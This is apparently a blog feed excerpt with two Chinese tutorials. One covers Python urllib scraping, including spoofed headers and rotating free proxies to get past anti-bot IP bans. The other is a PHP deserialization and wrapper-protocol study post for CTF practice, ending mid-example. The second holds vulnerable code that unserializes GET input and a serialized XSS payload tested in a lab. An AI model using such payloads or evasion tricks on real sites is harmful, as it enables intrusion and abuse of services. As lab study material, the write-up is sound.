        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>继续python的学习，这次学习爬虫，听说比较好玩，我也学学。</p><h1 id="爬虫前奏"><a href="#爬虫前奏" class="headerlink" title="爬虫前奏"></a>爬虫前奏</h1><h2 id="什么是网络爬虫？"><a href="#什么是网络爬虫？" class="headerlink" title="什么是网络爬虫？"></a>什么是网络爬虫？</h2><ol><li>爬虫的实际例子：</li></ol><ul><li>搜索引擎(百度、谷歌、360搜索等)</li><li>数据分析与研究</li><li>抢票软件等</li></ul><ol start="2"><li>什么是网络爬虫</li></ol><ul><li>通俗理解：爬虫是一个模拟人类请求网站行为的程序，可以自动请求网页，并将数据提取下来，然后使用一定的规则提取有价值的数据。</li><li>专业介绍：🍗<a href="https://baike.baidu.com/item/%E7%BD%91%E7%BB%9C%E7%88%AC%E8%99%AB/5162711?fromtitle=%E7%88%AC%E8%99%AB&fromid=22046949&fr=aladdin">百度百科</a>🍖<a href="https://zh.wikipedia.org/wiki/%E7%B6%B2%E8%B7%AF%E7%88%AC%E8%9F%B2">维基百科</a></li></ul><ol start="3"><li>通用爬虫和聚焦爬虫</li></ol><ul><li>通用爬虫：通用爬虫是搜索引擎提取系统（百度等）的重要组成部分。主要是将互联网上的网页下载到本地，形成一个互联网内容的镜像备份。</li><li>聚焦爬虫：是面向特定需求的一种网络爬虫程序，他与通用爬虫的区别就在于：聚焦爬虫在实践网页抓取的时候会对内容进行筛选和处理，尽量保证只抓取与需求相关的网页信息。</li></ul><ol start="4"><li>大部分语言基本上都可以来写爬虫，但是python有它独特的优点。</li></ol><h1 id="网络请求"><a href="#网络请求" class="headerlink" title="网络请求"></a>网络请求</h1><h2 id="urlopen函数用法"><a href="#urlopen函数用法" class="headerlink" title="urlopen函数用法"></a>urlopen函数用法</h2><p>urllib库是python中最基本的网络请求库。可以模仿浏览器的行为，向指定的服务器发送一个请求，并可以保存服务器返回的数据。</p><p>在Python3的urllib库中，所有和网络请求相关的方法，都被集成到<code>urllib.request</code>模块下面了。基本使用栗子：</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> urllib <span class="token keyword">import</span> requestresp <span class="token operator">=</span> request<span class="token punctuation">.</span>urlopen<span class="token punctuation">(</span><span class="token string">"http://www.baidu.com"</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>resp<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p><img src="https://img-blog.csdnimg.cn/20200712121120827.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>实际上，使用浏览器访问百度，右键查看源代码，会发现，跟上面打印的数据是一样的。也就是说上面三行代码已经帮我将百度首页的全部代码爬下来了。<br><code>urlopen</code>函数的详细介绍：</p><pre class="language-python" data-language="python"><code class="language-python">url<span class="token punctuation">:</span>请求的urldata<span class="token punctuation">:</span>请求的data，如果设置了这个值，那么将变成post请求。返回值<span class="token punctuation">:</span>返回值是一个http<span class="token punctuation">.</span>client<span class="token punctuation">.</span>HTTPResponse对象，这个对象是一个类文件句柄对象。有read<span class="token punctuation">(</span>size<span class="token punctuation">)</span>、 readline、 readlines以及getcode等方法。</code></pre><p>getcode就是获取当前响应的这个状态码。</p><h2 id="urlretrieve函数用法"><a href="#urlretrieve函数用法" class="headerlink" title="urlretrieve函数用法"></a>urlretrieve函数用法</h2><p>这个函数可以方便的将网页上的一个文件保存到本地，以下代码可以非常方便的将百度的首页下载到本地：</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> urllib <span class="token keyword">import</span> requestrequest<span class="token punctuation">.</span>urlretrieve<span class="token punctuation">(</span><span class="token string">'http://www.baidu.com/'</span><span class="token punctuation">,</span><span class="token string">'baidu.html'</span><span class="token punctuation">)</span></code></pre><p><img src="https://img-blog.csdnimg.cn/2020071213080144.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>这个就是爬取下来的baidu页面<br>还可以爬取图片<br>随便找张图片，复制它的地址，然后修改参数，进行爬取<br><img src="https://img-blog.csdnimg.cn/20200712131221612.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>这是一张鲁班的图片，成功爬取下来了。</p><h2 id="参数解码和解码函数"><a href="#参数解码和解码函数" class="headerlink" title="参数解码和解码函数"></a>参数解码和解码函数</h2><p><code>urlencode</code>函数<br>用浏览器发送请求的时候，如果URL中包含了中文或者其他特殊字符，那么浏览器会自动的给它进行编码。而如果使用代码发送请求，那么就必须手动的进行编码，这个时候就应该使用<code>urlencode</code>函数来实现。<code>urlencode</code>可以把字典数据转换为URL编码的数据。示例代码如下</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> urllib <span class="token keyword">import</span> parsedata <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'name'</span><span class="token punctuation">:</span><span class="token string">'m0re'</span><span class="token punctuation">,</span><span class="token string">"age"</span><span class="token punctuation">:</span><span class="token number">18</span><span class="token punctuation">,</span><span class="token string">'great'</span><span class="token punctuation">:</span><span class="token string">'hello,world'</span><span class="token punctuation">&#125;</span>j4y <span class="token operator">=</span> parse<span class="token punctuation">.</span>urlencode<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>j4y<span class="token punctuation">)</span></code></pre><p>结果：</p><pre class="language-python" data-language="python"><code class="language-python">name<span class="token operator">=</span>m0re<span class="token operator">&amp;</span>age<span class="token operator">=</span><span class="token number">18</span><span class="token operator">&amp;</span>great<span class="token operator">=</span>hello<span class="token operator">%</span>2Cworld</code></pre><p>还可以这么做<br><img src="https://img-blog.csdnimg.cn/20200712134642641.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br><code>parse_qs</code>函数可以将urlencode函数编码过的字符串进行解码<br>如下<br><img src="https://img-blog.csdnimg.cn/20200712135413295.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"></p><h2 id="urlparse和urlsplit"><a href="#urlparse和urlsplit" class="headerlink" title="urlparse和urlsplit"></a><code>urlparse</code>和<code>urlsplit</code></h2><p>有时候拿到一个URL，想要对这个URL中的各个组成部分进行分割，那么这个时候就可以使用<code>urlparse</code>或者是<code>urlsplit</code>来进行分割。示例代码如下：</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment">#encoding: utf-8</span><span class="token keyword">from</span> urllib <span class="token keyword">import</span> request<span class="token punctuation">,</span>parseurl <span class="token operator">=</span> <span class="token string">'http://www.baidu.com/s?username=zhiliao'</span>result <span class="token operator">=</span> parse<span class="token punctuation">.</span>urlsplit<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'scheme'</span><span class="token punctuation">,</span>result<span class="token punctuation">.</span>scheme<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'netloc'</span><span class="token punctuation">,</span>result<span class="token punctuation">.</span>netloc<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'path'</span><span class="token punctuation">,</span>result<span class="token punctuation">.</span>path<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'query'</span><span class="token punctuation">,</span>result<span class="token punctuation">.</span>query<span class="token punctuation">)</span></code></pre><p><img src="https://img-blog.csdnimg.cn/20200712140303705.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br><code>urlparse</code>和<code>urlsplit</code>基本上是一模一样的，唯一不一样的地方是，<code>urlparse</code>里面多了一个<code>params</code>属性，而<code>urlsplit</code>没有这个属性。比如有一个<code>URL</code>为<code>http://www.baidu.com/s;hello?wd=python&amp;username=abc#1</code>，那么<code>urlparse</code>可以获取到<code>hello</code>，而<code>urlsplit</code>不可以获取到。但是<code>url</code>中的<code>params</code>也用的比较少。</p><h2 id="Request类"><a href="#Request类" class="headerlink" title="Request类"></a>Request类</h2><p>如果想要在请求的时候增加一些请求头，那么必须使用<code>request.Request</code>类来实现。比如要增加一个<code>User-Agent</code>，示例代码</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment">#encoding: utf-8</span><span class="token keyword">from</span> urllib <span class="token keyword">import</span> requesturl <span class="token operator">=</span> <span class="token string">'https://www.xxxxxx.com/zhaopin/Python/?labelWords=label'</span>headers <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'User-Agent'</span><span class="token punctuation">:</span><span class="token string">'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36'</span><span class="token punctuation">&#125;</span>req <span class="token operator">=</span> request<span class="token punctuation">.</span>Request<span class="token punctuation">(</span>url<span class="token punctuation">,</span>headers<span class="token operator">=</span>headers<span class="token punctuation">)</span>resp <span class="token operator">=</span> request<span class="token punctuation">.</span>urlopen<span class="token punctuation">(</span>req<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>resp<span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>可以看出也是可以爬取到的<br><img src="https://img-blog.csdnimg.cn/20200712143038154.png" alt="m0re" loading="lazy"><br>然后要记一点就是不加<code>User-Agent</code>的话，爬虫进行爬取的话，是不会得到有用的信息的，可以将上面的代码中的<code>user-Agent</code>去掉试试，如果不加<code>User-Agent</code>网站会轻易的识别出来爬虫，然后不给它爬取有用的信息。</p><p>到那时有些信息是需要爬取js代码才能得到的。比如爬取某网站的职位招聘信息。<br>先找到需要爬取的网站的以下信息：<br><img src="https://img-blog.csdnimg.cn/20200714172731396.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>首先找到信息所在的网页，查看请求的URL和请求方式</p><p>其次就是data数据<br><img src="https://img-blog.csdnimg.cn/20200714172919237.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>写入代码中去，模仿浏览器访问网页以达到爬取信息的目的</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment">#encoding: utf-8</span><span class="token keyword">from</span> urllib <span class="token keyword">import</span> request<span class="token punctuation">,</span>parse<span class="token comment">#url = 'https://www.xxxxx.com/jobs/list_python?labelWords=&amp;fromSearch=true&amp;suginput='</span><span class="token comment">#resp = request.urlopen(url)</span><span class="token comment">#print(resp.read())</span>url <span class="token operator">=</span> <span class="token string">'https://www.xxxxxx.com/jobs/positionAjax.json?px=default&amp;city=%E5%8C%97%E4%BA%AC&amp;needAddtionalResult=false'</span>headers <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'User-Agent'</span><span class="token punctuation">:</span><span class="token string">'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36'</span> <span class="token punctuation">&#125;</span>data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token string">'first'</span><span class="token punctuation">:</span> <span class="token string">'true'</span><span class="token punctuation">,</span>    <span class="token string">'pn'</span><span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">,</span>    <span class="token string">'kd'</span><span class="token punctuation">:</span> <span class="token string">'python'</span><span class="token punctuation">&#125;</span>req <span class="token operator">=</span> request<span class="token punctuation">.</span>Request<span class="token punctuation">(</span>url<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">,</span> data<span class="token operator">=</span>parse<span class="token punctuation">.</span>urlencode<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> method<span class="token operator">=</span><span class="token string">'POST'</span><span class="token punctuation">)</span>resp <span class="token operator">=</span> request<span class="token punctuation">.</span>urlopen<span class="token punctuation">(</span>req<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>resp<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>爬取某招聘网站的职位信息，。这样已经是初步模型了，但是爬取不到信息，因为目前大多数网站都有反爬机制，所以报出了这样一个错误，其实也不是错误，就是浏览器返回的信息</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token string">b'&#123;"status":false,"msg":"\xe6\x82\xa8\xe6\x93\x8d\xe4\xbd\x9c\xe5\xa4\xaa\xe9\xa2\x91\xe7\xb9\x81,\xe8\xaf\xb7\xe7\xa8\x8d\xe5\x90\x8e\xe5\x86\x8d\xe8\xae\xbf\xe9\x97\xae","clientIp":"42.226.97.244","state":2402&#125;\n'</span></code></pre><p>这是经过URL编码的，解码一下就是访问的过于频繁，让我们稍后再访问。但是再回到浏览器中访问是完全没有问题的。<br>原因就是反爬虫机制的作用。还是能轻易检查出来我的爬虫，需要模仿的再像一点。加个Referer（同样是去浏览器的开发者界面寻找）<br>有些网站的反爬虫机制比较强，可能加了Referer还是爬取不到有用的信息。</p><p>需要再进行深层次的学习，添加其他验证身份的条件，比如下面将要学习的Cookie。</p><h2 id="ProxyHandler处理器（代理设置）"><a href="#ProxyHandler处理器（代理设置）" class="headerlink" title="ProxyHandler处理器（代理设置）"></a>ProxyHandler处理器（代理设置）</h2><p>很多网站会检测某一段时间某个IP的访问次数(通过流量统计，系统日志等)，如果访问次数多的不像正常人，它会禁止这个IP访问。所以应对方法是设置一些代理服务器，每隔一段时间换一个代理，就算IP地址被禁止，依然可以换个IP继续爬取。<br><code>urllib</code>中通过<code>ProxyHandler</code>来设置代理服务器。<br>前提：</p><ul><li><a href="http://httpbin.org/">http://httpbin.org/</a>这个都可以访问的。这个网站可以方便的查看http请求的一些参数</li><li>一个代理IP<br><img src="https://img-blog.csdnimg.cn/20200715184453382.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>尽量选择一个最后验证时间比较近的。<br>代码示例：</li></ul><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment">#encoding: utf-8</span><span class="token keyword">from</span> urllib <span class="token keyword">import</span> requesturl <span class="token operator">=</span> <span class="token string">"http://httpbin.org/ip"</span><span class="token comment"># 传入代理</span>handler <span class="token operator">=</span> request<span class="token punctuation">.</span>ProxyHandler<span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">"http"</span><span class="token punctuation">:</span><span class="token string">"49.70.89.14:9999"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token comment"># 使用上面创建的handler构建一个opener</span>opener <span class="token operator">=</span> request<span class="token punctuation">.</span>build_opener<span class="token punctuation">(</span>handler<span class="token punctuation">)</span><span class="token comment"># 使用opener去发送一个请求</span>resp <span class="token operator">=</span> opener<span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>resp<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><ul><li><p>使用<code>urllib.request.ProxyHandler</code>传入一个代理，这个代理是一个字典，字典的key依赖于代理服务器能够接收的类型，一般是<code>http</code>或者<code>https</code></p></li><li><p>使用上一步创建的<code>headler</code>，以及<code>request.build_opener</code>创建一个<code>opener</code>对象</p></li><li><p>使用上一步创建的<code>opener</code>，调用<code>open</code>函数，发起请求</p></li></ul><p>==注意：==<br>代理需要自己设置有用的代理，我这个只是个免费的，现在可以，不知道明天还行不行，就这样。<br>然后各种报错，emmm，代码没问题，就是配置的问题了</p><p>报错一：</p><pre class="language-python" data-language="python"><code class="language-python">urllib<span class="token punctuation">.</span>error<span class="token punctuation">.</span>URLError<span class="token punctuation">:</span> <span class="token operator">&lt;</span>urlopen error <span class="token punctuation">[</span>Errno <span class="token number">11001</span><span class="token punctuation">]</span> getaddrinfo failed<span class="token operator">></span></code></pre><p>这个与请求的URL有关，解决办法就是，把请求的URL原本是单引号包着的，改成双引号就OK了。(上面的代码已经修改)</p><p>报错二：</p><pre class="language-python" data-language="python"><code class="language-python">urllib<span class="token punctuation">.</span>error<span class="token punctuation">.</span>URLError<span class="token punctuation">:</span> <span class="token operator">&lt;</span>urlopen error <span class="token punctuation">[</span>WinError <span class="token number">10061</span><span class="token punctuation">]</span> 由于目标计算机积极拒绝，无法连接。<span class="token operator">></span></code></pre><p>这个百度就有，但是有的解决不了，是电脑配置的原因。<br>可参考<br><a href="https://bbs.csdn.net/topics/392282730?list=lz">https://bbs.csdn.net/topics/392282730?list=lz</a><br><a href="http://www.manongjc.com/article/113971.html">http://www.manongjc.com/article/113971.html</a><br>配置问题，不细说了。<br><img src="https://img-blog.csdnimg.cn/20200715190503345.png" alt="m0re" loading="lazy"><br>下面挂几个常用的代理，如需更多请百度。<br>常用的代理有：</p><ul><li>快代理：<a href="http://www.kuaidaili.com/">http://www.kuaidaili.com/</a></li><li><a href="http://www.goubanjia.com/">http://www.goubanjia.com/</a></li><li><a href="http://www.66ip.cn/1.html">http://www.66ip.cn/1.html</a></li><li><a href="http://www.ip3366.net/free/">http://www.ip3366.net/free/</a></li><li><a href="http://www.kxdaili.com/dailiip.html">http://www.kxdaili.com/dailiip.html</a></li><li><a href="https://www.kuaidaili.com/free/">https://www.kuaidaili.com/free/</a></li><li><a href="https://www.xicidaili.com/">https://www.xicidaili.com/</a></li><li><a href="http://www.iphai.com/">http://www.iphai.com/</a></li><li><a href="http://www.89ip.cn/">http://www.89ip.cn/</a></li><li><a href="http://www.proxy360.cn/Region/China">http://www.proxy360.cn/Region/China</a></li><li><a href="http://www.ip181.com/">http://www.ip181.com/</a></li><li><a href="https://premproxy.com/">https://premproxy.com/</a></li><li><a href="http://www.xroxy.com/">http://www.xroxy.com/</a></li><li><a href="http://www.data5u.com/free/">http://www.data5u.com/free/</a><h2 id="Cookie模拟登陆"><a href="#Cookie模拟登陆" class="headerlink" title="Cookie模拟登陆"></a>Cookie模拟登陆</h2>在浏览器中寻找到cookie，加入到爬虫脚本中去。<br><img src="https://img-blog.csdnimg.cn/20200715180716730.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>添加到headers中，然后进行爬取。<br>以人人网为例。人人网中，要访问用户的主页进行浏览信息，需要登录才可以，也就是要有cookie信息，如果想用代码的方式访问，就需要有正确的cookie信息才能访问，解决方法有两种：第一种是使用浏览器访问，然后将cookie信息复制下来，放到headers中。（没有账号，懒得注册了）缺点是每次访问都需要从浏览器复制cookie，麻烦。在Python处理Cookie，一般是通过<code>http.cookiejar</code>模块和<code>urllib</code>模块的<code>HTTPCookieProcessor</code>处理器类一起使用。<code>http.cookiejar</code>模块的作用是提供用于存储cookie的对象。而<code>HTTPCookieProcessor</code>处理器主要作用是处理这些cookie对象，并构建handler对象。<h2 id="爬虫自动登录访问授权页面"><a href="#爬虫自动登录访问授权页面" class="headerlink" title="爬虫自动登录访问授权页面"></a>爬虫自动登录访问授权页面</h2><code>http.cookiejar</code>模块<br>该模块主要的类有：CookieJar、FileCookieJar、MozillaCookieJar、LWPCookieJar。这四个类的作用分别如下</li></ul><ol><li><code>CookieJar</code>：管理HTTP cookie值、存储HTTP请求生成的cookie、向传出的HTTP请求添加cookie的对象。整个cookie都存储在内存中，对CookieJar实例进行垃圾回收后cookie也将丢失。</li><li><code>FileCookieJar</code>：从<code>CookieJar</code>派生而来，用来创建<code>FileCookieJar</code>实例，检索cookie信息并将cookie存储到文件中。<code>filename</code>是存储cookie的文件名。<code>delayload</code>为True时支持延迟访问文件，即只有在需要时才读取文件或在文件中存储数据。</li><li><code>MozillaCookieJar</code>：从<code>FileCookieJar</code>派生而来，创建与Mozilla浏览器cookie.txt兼容的<code>FileCookieJar</code>实例。</li><li><code>LWPCookieJar</code>：从<code>FileCookieJar</code>派生而来，创建与libwww-per标准的Set-Cookie3文件格式兼容的<code>FileCookieJar</code>实例。</li></ol><p>先学习到这里，需要消化一下，下次继续学习这个部分——利用爬虫登录登陆访问。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> 爬虫 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP序列化与反序列化、PHP伪协议</title>
      <link href="/posts/1c4a3d56/"/>
      <url>/posts/1c4a3d56/</url>
      
        <content type="html"><![CDATA[<p>最近的比赛都有PHP反序列化的题，于是学习一下。</p><h1 id="序列化和反序列化"><a href="#序列化和反序列化" class="headerlink" title="序列化和反序列化"></a>序列化和反序列化</h1><h2 id="序列化"><a href="#序列化" class="headerlink" title="序列化"></a>序列化</h2><p>要反序列化，先学习序列化，了解<code>serialize()</code>函数，定义啥的就不复制粘贴了，理解了就好。直接简单明了将通俗点。<br>序列化就是通过使用<code>serialize()</code>函数将一个对象变成可以传输的字符串，比如下面的栗子：</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name">baby</span><span class="token punctuation">&#123;</span><span class="token keyword">public</span> <span class="token variable">$test</span><span class="token operator">=</span><span class="token double-quoted-string string">"lalala"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$baby</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">B</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//创建一个对象</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$baby</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//把这个对象进行序列化</span></code></pre><p>序列化后的到的结果是这个样子的</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token constant">O</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token double-quoted-string string">"baby"</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span>s<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token double-quoted-string string">"test"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token double-quoted-string string">"lalala"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>参数说明：</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token constant">O</span><span class="token punctuation">:</span>代表object<span class="token number">4</span><span class="token punctuation">:</span>代表对象名字长度为<span class="token number">4</span>个字符baby<span class="token punctuation">:</span>对象的名字<span class="token number">1</span><span class="token punctuation">:</span>代表对象里面有一个变量s<span class="token punctuation">:</span>数据类型<span class="token number">4</span><span class="token punctuation">:</span>变量名称的长度test<span class="token punctuation">:</span>变量名称s<span class="token punctuation">:</span>数据类型<span class="token number">7</span><span class="token punctuation">:</span>变量值的长度lalala<span class="token punctuation">:</span>变量值</code></pre><h2 id="反序列化unserialize"><a href="#反序列化unserialize" class="headerlink" title="反序列化unserialize()"></a>反序列化unserialize()</h2><p>简单来说：就是把被序列化的字符串还原为对象，然后在接下来的代码中继续使用。</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$u</span><span class="token operator">=</span><span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"O:4:"</span>baby<span class="token double-quoted-string string">":1:&#123;s:4:"</span>test<span class="token double-quoted-string string">";s:6:"</span>lalala<span class="token double-quoted-string string">";&#125;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$u</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">test</span><span class="token punctuation">;</span> <span class="token comment">//得到的结果是lalala</span></code></pre><h2 id="魔法函数"><a href="#魔法函数" class="headerlink" title="魔法函数"></a>魔法函数</h2><p>序列化和反序列化本身没有问题，但是如果反序列化的内容是用户可以控制的，且后台不正当的使用了PHP中的魔法函数，就会导致安全问题。<br>常见的几个魔法函数：</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment">//当一个对象创建时被调用</span><span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment">//当一个对象销毁时被调用</span><span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span>   <span class="token comment">//当一个对象被当作一个字符串使用</span><span class="token function">__sleep</span><span class="token punctuation">(</span><span class="token punctuation">)</span>     <span class="token comment">//在对象被序列化之前使用</span><span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span>   <span class="token comment">//将在序列化之后立即被调用</span></code></pre><p>漏洞举例：</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name">S</span><span class="token punctuation">&#123;</span><span class="token keyword">var</span> <span class="token variable">$test</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"pikaqiu"</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">test</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$s</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'test'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>@<span class="token variable">$unser</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>payload<br><code>O:1:&quot;S&quot;:1:&#123;s:4:&quot;test&quot;;s:29:&quot;&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;&quot;;&#125;</code><br>当输入这个payload时，这个payload是已经序列化的，对象test的值是一个xss弹窗脚本，上面的代码会对payload进行反序列化，然后在对象被销毁时执行魔法函数。执行xss弹窗。<br>下面靶场试验一下。pikachu<br><img src="https://img-blog.csdnimg.cn/20200512232636478.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>在框里输入序列化后的payload。进行提交。<br><img src="https://img-blog.csdnimg.cn/20200512232807445.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>成功弹窗。以上是最基础的PHP反序列化。</p><h1 id="PHP伪协议"><a href="#PHP伪协议" class="headerlink" title="PHP伪协议"></a>PHP伪协议</h1><p>PHP支持的伪协议有以下几种</p><pre class="language-Bash" data-language="Bash"><code class="language-Bash">php:&#x2F;&#x2F; — 访问各个输入&#x2F;输出流（I&#x2F;O streams）file:&#x2F;&#x2F; — 访问本地文件系统phar:&#x2F;&#x2F; — PHP 归档zlib:&#x2F;&#x2F; — 压缩流data:&#x2F;&#x2F; — 数据（RFC 2397）http:&#x2F;&#x2F; — 访问 HTTP(s) 网址ftp:&#x2F;&#x2F; — 访问 FTP(s) URLsglob:&#x2F;&#x2F; — 查找匹配的文件路径模式ssh2:&#x2F;&#x2F; — Secure Shell 2rar:&#x2F;&#x2F; — RARogg:&#x2F;&#x2F; — 音频流expect:&#x2F;&#x2F; — 处理交互式的流</code></pre><p><code>allow_url_fopen</code> 和<code>allow_url_include</code>这两个关键配置需要开启相应的服务，才能使用相关函数对伪协议的支持，配置相关在<code>php.ini</code>文件中</p><h1 id="php-协议"><a href="#php-协议" class="headerlink" title="php://协议"></a>php://协议</h1><p><code>php://</code>是用来访问各个输入、输出流的。<br>在<code>php://</code>下还有许多子协议</p><h3 id="php-input"><a href="#php-input" class="headerlink" title="php://input"></a>php://input</h3><p><code>php://input</code>代表可以访问请求的原始数据，简单来说POST请求的情况下，<code>php://input</code>可以获取到post的数据。<br><code>php://output</code> 是一个只写的数据流， 允许你以 print 和 echo 一样的方式 写入到输出缓冲区。</p><h3 id="php-input例题-ctf-show-web3"><a href="#php-input例题-ctf-show-web3" class="headerlink" title="php://input例题(ctf.show) web3"></a>php://input例题(ctf.show) web3</h3><p><img src="https://img-blog.csdnimg.cn/20200520132844443.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>首先提示是文件包含漏洞，构造payload</p><pre 